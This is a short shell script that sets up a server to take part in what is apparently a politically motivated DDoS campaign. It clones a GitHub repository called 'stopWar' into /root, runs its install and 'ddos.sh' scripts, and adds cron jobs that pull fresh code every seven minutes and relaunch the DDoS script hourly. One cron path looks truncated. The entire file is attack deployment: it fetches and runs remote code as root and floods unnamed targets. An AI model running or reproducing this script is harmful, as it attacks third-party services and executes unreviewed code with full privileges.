#!/bin/sh

set -e

apt-get update
apt-get upgrade -y
apt-get install -y git
cd  /root
/usr/bin/git clone https://github.com/angelloGit/stopWar
cd stopWar
./install.sh
./ddos.sh

crontab - <<__EOFF
*/7 * * * * cd /root/stopWar/ && /usr/bin/git pull
31 * * * * /root/stopWar/ddos.s
__EOFF
